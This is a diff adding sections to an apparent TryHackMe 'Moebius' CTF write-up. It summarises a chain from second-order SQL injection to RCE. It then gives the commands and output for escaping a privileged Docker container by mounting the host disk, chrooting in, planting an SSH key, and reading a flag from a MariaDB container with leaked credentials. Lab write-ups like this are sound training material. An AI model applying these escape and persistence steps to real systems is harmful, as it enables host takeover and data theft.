@@ -5,7 +5,12 @@ title: Moebius
 
 ## TL;DR
 
+In this challenge we first detect `Two Order SQL Injection`, and exploit to get `LFI`.
+Then, we analyze the source code and exploit it to get arbitrary PHP code execution. From there we add `LD_PRELOAD` trick to bypass disabled php function, and finally get `RCE`.
 
+We privilege escalate to `root` using `setuid` on python, and then break out of the container using mounting on `/dev/nvme0n1p1` (the container was privileged).
+
+We connect to `host machine`, and from there we move to the other container to grab the `root` flag from the `mysql` service.
 
 ### Recon
 
@@ -557,7 +562,199 @@ and we finnaly got reverse shell!
 
 ### Escapte from container
 
+First, I checked for root privileges, using `sudo -l`. I seams we can do everything.
+```bash
+www-data@bb28d5969dd5:/var/www/html$ sudo -l
+Matching Defaults entries for www-data on bb28d5969dd5:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
 
-### Privilege Escalation to Root
+User www-data may run the following commands on bb28d5969dd5:
+    (ALL : ALL) ALL
+    (ALL : ALL) NOPASSWD: ALL
+    ```
+Using linpeas we can find that the folder `/dev` is mounted:
 
+![mounted](image-30.png)
 
+I executed `mount`, we can see the file `/dev/nvme0n1p1` is mounted, 
+```bash
+www-data@bb28d5969dd5:/var/www/html$ mount
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4S7RSQVSSDZZ5TDS7KIJAFL5GZ:/var/lib/docker/overlay2/l/P6WCAJFVMV7JIFQYXSAYJUOEBG:/var/lib/docker/overlay2/l/YD7WMHG4IPXZTISOTL5CKNM7D4:/var/lib/docker/overlay2/l/NVTABTT3KHOUI43SEO6Z33MU4C:/var/lib/docker/overlay2/l/YZBFISSCDKCHBKDF7T33PWZRUX:/var/lib/docker/overlay2/l/EWU26YKM5EBYXKR7S36FCLFKYD:/var/lib/docker/overlay2/l/6JKWLWK6MHKH2XOIE2PNK5OLYH:/var/lib/docker/overlay2/l/3QS3A5IQLD2GEP3B3BQJMHESZI:/var/lib/docker/overlay2/l/VEHMAVKQMBXUSV5CD7DTINWOTR:/var/lib/docker/overlay2/l/YSGNPC2D3IXWM375QQMGMGFZFH:/var/lib/docker/overlay2/l/UKXWGTS6D53S33EFPBIPEJKSWS:/var/lib/docker/overlay2/l/LPZX4557HXOP63LOZXS5J5DNRJ:/var/lib/docker/overlay2/l/R2ZFPUIJUSLVVOU6AKQ5NUWEXA:/var/lib/docker/overlay2/l/ZRIIAJB4W32UJPJHDEHXPPBGRY:/var/lib/docker/overlay2/l/TSCQ32KRFNRGLFRBPFVTGXGO6L:/var/lib/docker/overlay2/l/ICRXAFNUT5TQYDH3MSX3SINL75:/var/lib/docker/overlay2/l/5QXHDLPUZN2PMU4TO5OQOSIJ3D:/var/lib/docker/overlay2/l/BMQYVFLAEERXL4JVDMKPREANXV:/var/lib/docker/overlay2/l/HWMYJK4KJQWKX7LSJNFMFSMUEZ,upperdir=/var/lib/docker/overlay2/7b3cf26f528efa374bb00eda5e44378ccee75cbcf5a9c9f82764191ad6c0d474/diff,workdir=/var/lib/docker/overlay2/7b3cf26f528efa374bb00eda5e44378ccee75cbcf5a9c9f82764191ad6c0d474/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/nvme0n1p1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/nvme0n1p1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/nvme0n1p1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
+```
+
+and also more, using `lsblk` to list block files
+```bash
+www-data@bb28d5969dd5:/var/www/html$ lsblk
+NAME        MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
+loop0         7:0    0   87M  1 loop 
+loop1         7:1    0 63.9M  1 loop 
+loop2         7:2    0 38.8M  1 loop 
+nvme2n1     259:0    0    1G  0 disk 
+nvme0n1     259:1    0   40G  0 disk 
+`-nvme0n1p1 259:3    0   40G  0 part /etc/hosts
+                                     /etc/hostname
+                                     /etc/resolv.conf
+nvme1n1     259:2    0    1G  0 disk
+```
+
+So, let's execute these commands:
+```bash
+mkdir /tmp/LOL
+sudo mount /dev/nvme0n1p1 /tmp/LOL
+```
+
+than, we can access the root file system at `/tmp/LOL`.
+
+![ls -l](image-31.png)
+
+Okay, let's exeucte chroot:
+```bash
+sudo chroot /tmp/LOL 
+```
+
+![chroot](image-32.png)
+
+and grab the user flag:
+```bash
+root@bb28d5969dd5:~# cat /root/user.txt 
+THM{ddb3254b89803ca177d7d11024e7935a}
+```
+
+BTW, we can check and see in the `docker-compose.yml` that the docker was privileged
+
+![privileged](image-33.png)
+
+### Find the root flag inside another container, in the mysql service
+
+Inside the `challenge` dir, we can find `db/db.env` which holds credentials:
+```bash
+root@bb28d5969dd5:~/challenge/db# cat db.env; echo
+MYSQL_PASSWORD=TAJnF6YuIot83X3g
+MYSQL_DATABASE=web
+MYSQL_USER=web
+MYSQL_ROOT_PASSWORD=gG4i8NFNkcHBwUpd
+```
+
+![mysql db](image-36.png)
+
+First, we need to get ssh connection to the host machine, let's add the ssh keys.
+
+I created pair of keys on my local machine:
+```bash
+┌──(agonen㉿kali)-[~/thm/Moebius]
+└─$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/agonen/.ssh/id_rsa): moebius_key
+Enter passphrase for "moebius_key" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in moebius_key
+Your public key has been saved in moebius_key.pub
+The key fingerprint is:
+SHA256:xxpbm0E/w/QEtgZ/j4m+FbcjhOvgxUhjhmUgoMwYHG4 agonen@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|o..... .  . o    |
+|=o.   . .  + o   |
+|.E       o. = o  |
+|.       +o =.= + |
+|       .S==.*.= o|
+|        +*+=oo o.|
+|        ooo+...o |
+|        . +  o. .|
+|         . ..    |
++----[SHA256]-----+
+```
+
+and pasted the public key into the authorized keys on the server:
+```bash
+┌──(agonen㉿kali)-[~/thm/Moebius]
+└─$ cat moebius_key.pub | xclip -sel clip
+```
+
+![authorized keys](image-34.png)
+
+Now, we can login via ssh:
+```bash
+ssh root@moebius -i moebius_key
+```
+
+![sshing](image-35.png)
+
+Now, we can look for running continaers:
+```bash
+root@ubuntu-jammy:~# docker container ps
+CONTAINER ID   IMAGE                    COMMAND                  CREATED        STATUS       PORTS                                 NAMES
+89366d62e05c   mariadb:10.11.11-jammy   "docker-entrypoint.s…"   9 months ago   Up 3 hours   3306/tcp                              challenge-db-1
+bb28d5969dd5   challenge-web            "docker-php-entrypoi…"   9 months ago   Up 3 hours   0.0.0.0:80->80/tcp, [::]:80->80/tcp   challenge-web-1
+```
+
+There are two contianers, let's enter the continaer `mariadb:10.11.11-jammy`:
+```bash
+docker exec -it 89366d62e05c /bin/bash
+```
+
+Now, we can connect to the mysql service, with user `root` and password `gG4i8NFNkcHBwUpd`:
+```bash
+root@89366d62e05c:/# mysql -u root -p                                                                                                                        
+Enter password:                                                                                                                                              
+Welcome to the MariaDB monitor.  Commands end with ; or \g.                                                                                                  
+Your MariaDB connection id is 13                                                                                                                             
+Server version: 10.11.11-MariaDB-ubu2204 mariadb.org binary distribution                                                                                     
+                                                                                                                                                             
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                                                                         
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement. 
+
+MariaDB [(none)]>
+```
+
+We can find the root flag inside the db `secret` and table `secrets`:
+```bash
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| secret             |
+| sys                |
+| web                |
++--------------------+
+6 rows in set (0.000 sec)
+
+MariaDB [(none)]> use secret;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [secret]> show tables;
++------------------+
+| Tables_in_secret |
++------------------+
+| secrets          |
++------------------+
+1 row in set (0.000 sec)
+
+MariaDB [secret]> select * from secrets;
++---------------------------------------+
+| flag                                  |
++---------------------------------------+
+| THM{2ba37995df993f1294e7c155ce7ef929} |
++---------------------------------------+
+1 row in set (0.000 sec)
+```
+
+![grab root flag](image-37.png)
